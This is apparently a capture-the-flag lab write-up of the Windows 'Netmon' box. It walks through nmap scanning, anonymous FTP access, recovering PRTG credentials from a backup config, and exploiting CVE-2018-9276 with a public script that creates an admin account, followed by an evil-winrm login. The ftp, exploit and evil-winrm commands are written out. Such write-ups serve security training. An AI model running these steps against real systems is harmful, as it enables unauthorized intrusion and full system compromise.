# Netmon — Easy — Windows

**Date:** 16 June 2026

---

## Tags
`#windows` `#ftp` `#anonymous-login` `#prtg` `#cve-2018-9276` `#config-leak` `#system-privesc`

---

## What I Know

| Item            | Detail                                                                  |
| --------------- | ------------------------------------------------------------------------ |
| Target          | 10.129.230.176                                                          |
| OS              | Windows (Server 2008 R2 – 2012)                                         |
| Open ports      | 21, 80, 135, 139, 445, 5985, 47001, 49664–49669                         |
| Services        | Microsoft FTP (anonymous), PRTG Network Monitor (HTTP), RPC/SMB, WinRM  |
| Web app         | PRTG Network Monitor 18.1.37.13946                                       |
| Foothold creds  | prtgadmin:PrTg@dmin2019 (recovered from a backup config via FTP)         |
| Privesc vector  | CVE-2018-9276 (authenticated RCE via PRTG notification, runs as SYSTEM)  |

---

## Recon Notes

### Nmap Results

```
nmap --min-rate 3000 -T4 -p- 10.129.230.176

Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-16 11:10 +0100
Nmap scan report for 10.129.230.176
Host is up (0.049s latency).
Not shown: 65522 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 33.02 seconds
```

<img width="932" height="583" alt="image" src="https://github.com/user-attachments/assets/491411d2-966f-41b1-8e45-074d5a6ce194" />

```
nmap -sC -sV -p21,80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 10.129.230.176

Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-16 16:56 +0100
Nmap scan report for 10.129.230.176
Host is up (0.018s latency).

PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 06-16-26  09:41AM       <DIR>          Users
|_11-10-23  10:20AM       <DIR>          Windows
80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-06-16T15:57:16
|_  start_date: 2026-06-16T10:09:11
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb-security-mode:
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.08 seconds
```

<img width="1187" height="1173" alt="image" src="https://github.com/user-attachments/assets/7a4709a0-de4b-4e3b-84c0-d1c561d9cd16" />

**What each port tells me:**
- **Port 21 (FTP)** — Misconfigured to allow anonymous login. Worth investigating first since it could expose files directly.
- **Port 80 (HTTP)** — A web application is running (later identified as PRTG Network Monitor). Since anonymous FTP is open, I'll focus here next, expecting the two to be related.
- **Port 135 (MSRPC)** — Standard Windows RPC endpoint mapper; not directly useful on its own, but confirms this is a typical Windows host with RPC services exposed.
- **Ports 139, 445 (SMB)** — Like FTP, another interesting surface to check once I've covered 21 and 80.
- **Ports 5985, 47001 (HTTP/WinRM)** — Less common HTTP ports; 5985 in particular suggests WinRM is enabled, which becomes relevant once I have valid credentials.
- **Ports 49664–49669 (MSRPC)** — Dynamic high-numbered RPC ports, automatically allocated by Windows for various RPC services. Not directly actionable without more specific RPC enumeration.

---

## Enumeration Log

```
OBSERVATION: Port 21 is open with anonymous login allowed
WHAT IT TELLS ME: I can access the FTP file share as an anonymous user, no password needed
WHAT I AM GOING TO TRY: Log in anonymously and explore the share
WHY: The FTP server is misconfigured to allow anonymous login
RESULT: Logged in and found what looks like the server's C:\ filesystem.
  Navigating to /Users/Public/Desktop lets me read user.txt
WHAT NEXT:
- Enumerate the filesystem further for anything interesting
- Investigate the web application
```

<img width="903" height="507" alt="image" src="https://github.com/user-attachments/assets/395a8219-766e-4e7e-91ad-8ed6390ea15a" />

<img width="890" height="230" alt="image" src="https://github.com/user-attachments/assets/0bd6ed66-cfb6-453b-8dc4-f5cf89807567" />


```
OBSERVATION:
- The web application is PRTG Network Monitor, with a login page
- Since the FTP share exposes the filesystem the app runs on, its install folder is worth enumerating
- The response headers show the server is running PRTG/18.1.37.13946
WHAT IT TELLS ME:
- The app may be using default credentials
- Config files or other sensitive data may sit in the app's install folder
- That specific version may have a known vulnerability
WHAT I AM GOING TO TRY:
- Research PRTG's default credentials
- Enumerate the web app's folder via the FTP share
- Research PRTG/18.1.37.13946 for known CVEs
WHY:
- To check if default creds are still active
- To find sensitive information
- To find a known way to abuse this version
RESULT:
- The well-known default creds prtgadmin:prtgadmin did not work
- PRTG stores its configuration under \ProgramData\Paessler\PRTG Network Monitor\
- This version is vulnerable to CVE-2018-9276 which can lead to command execution, but it requires authentication
WHAT NEXT:
- Browse \ProgramData\Paessler\PRTG Network Monitor\ via FTP for useful config files
- Since the CVE needs creds, finding valid credentials is the priority
```

<img width="2149" height="1104" alt="image" src="https://github.com/user-attachments/assets/f765f13d-f357-4879-a116-425ee7d32c80" />

<img width="450" height="343" alt="image" src="https://github.com/user-attachments/assets/2b2fe0ac-7446-47db-946b-05f6b1447c66" />

<img width="1137" height="212" alt="image" src="https://github.com/user-attachments/assets/677d3b59-7a36-4359-b303-abb4b8fb3370" />

<img width="862" height="690" alt="image" src="https://github.com/user-attachments/assets/4fcc3d83-39ed-4e85-a68c-05b6a2585ca6" />


```
OBSERVATION: Inside \ProgramData\Paessler\PRTG Network Monitor\ I found PRTG Configuration.old.bak,
  a backup configuration file
WHAT IT TELLS ME: It may contain credentials saved before a previous change
WHAT I AM GOING TO TRY: Download it to the attack machine and inspect it
RESULT: Recovered the credentials prtgadmin:PrTg@dmin2018, but they failed against the web app.
  Reasoning that a password-rotation policy might have simply bumped the year, I tried
  prtgadmin:PrTg@dmin2019 instead, and that worked
WHAT NEXT: Use the "PRTG Network Monitor 18.2.38 (Authenticated) Remote Code Execution" exploit to gain access to the system
```

<img width="852" height="57" alt="image" src="https://github.com/user-attachments/assets/84b2a569-b6a2-498c-99ef-d80eb6d8fc90" />

<img width="916" height="458" alt="image" src="https://github.com/user-attachments/assets/5bbc1a34-c6db-407e-9c1c-faadc924a221" />

<img width="2547" height="187" alt="image" src="https://github.com/user-attachments/assets/a78fd3d3-9695-4fe1-afa3-69ebb1450dc3" />

<img width="634" height="128" alt="image" src="https://github.com/user-attachments/assets/7f3a9615-6fd3-4454-b48d-da85563b2609" />

<img width="2091" height="590" alt="image" src="https://github.com/user-attachments/assets/908f843f-8794-4361-9b01-b02601c7e00b" />

<img width="2499" height="287" alt="image" src="https://github.com/user-attachments/assets/3b68a321-a07e-4d24-bbaf-938328434e5a" />

```
OBSERVATION: Using the authenticated RCE exploit, I was able to create an admin-level account
  'pentest' with password 'P3nT3st' on the underlying Windows system
WHAT IT TELLS ME: I can now use evil-winrm to log in as this new privileged user
RESULT: Logged in via evil-winrm as the new account and read root.txt
```

<img width="2287" height="568" alt="image" src="https://github.com/user-attachments/assets/67ab551c-f2a0-48f3-88ca-9ac80b3a56b6" />

<img width="2301" height="821" alt="image" src="https://github.com/user-attachments/assets/4ed12df1-1d65-4be8-8a1c-35b0905d5e3e" />

<img width="1669" height="779" alt="image" src="https://github.com/user-attachments/assets/c8299a94-b9c8-407b-8aab-6f000d331518" />

<img width="809" height="307" alt="image" src="https://github.com/user-attachments/assets/04453c5f-db03-45ae-a9db-53b71b78c710" />

---

## Foothold

**How I got in:** Anonymous FTP access exposed the server's filesystem, including the PRTG install directory, which held a backup configuration file (`PRTG Configuration.old.bak`) containing saved credentials. After trying the leaked year (2018) and getting rejected, I reasoned that an annual password-rotation policy might apply and tried the following year `prtgadmin:PrTg@dmin2019`  which authenticated successfully to the PRTG web interface.

**Command / exploit used:**
```
ftp 10.129.230.176
# Name: anonymous   Password: <anything>
get "PRTG Configuration.old.bak"
# inside the file: prtgadmin:PrTg@dmin2018  (rejected)
#                  prtgadmin:PrTg@dmin2019  (accepted)
```

**Why it worked:** Two stacked misconfigurations FTP allowing anonymous access to the entire filesystem, and a sensitive backup config file left in a readable location with cleartext credentials. The credential itself was slightly stale (rotated since the backup was made), but the rotation followed a predictable yearly pattern, which made the leaked value still useful as a starting guess.

---

## Privilege Escalation

**Path taken:** With valid PRTG credentials in hand, **CVE-2018-9276** (PRTG Network Monitor authenticated RCE) was usable. PRTG lets an authenticated user configure "Notifications" that run an arbitrary executable/script when triggered. Because the underlying PRTG Windows service itself runs with SYSTEM-level privileges, any command executed through that notification mechanism inherits that same elevated context, regardless of the web-app role of the account that configured it. I used a public exploit implementing this technique to create a new local account (`pentest`) with administrative rights, then connected with `evil-winrm` to read root.txt.

```
# exploit creates a privileged Windows account via a malicious PRTG notification
python3 prtg_exploit.py -t http://10.129.230.176 -u prtgadmin -p 'PrTg@dmin2019' \
  --new-user pentest --new-pass 'P3nT3st'

evil-winrm -i 10.129.230.176 -u pentest -p 'P3nT3st'
```

**Why it worked:** PRTG's web application allows defining custom notifications, including ones that execute arbitrary commands or scripts as part of monitoring/alerting. Because the PRTG service runs as SYSTEM on Windows, that notification command executes as SYSTEM too turning ordinary app-level authentication into full system compromise. The fix in later PRTG versions restricts what notification actions can do and who can configure them.

---

## Post-Box Debrief

1. **Foothold technique in one sentence:** Used anonymous FTP to read a leaked PRTG backup config file, then guessed a year-rotated variant of the recovered password to log into the PRTG web app.
2. **Privesc technique in one sentence:** Exploited CVE-2018-9276, PRTG's notification feature lets an authenticated user run commands that execute as SYSTEM because the PRTG service itself runs with SYSTEM privileges to create a privileged account and access the system via evil-winrm.
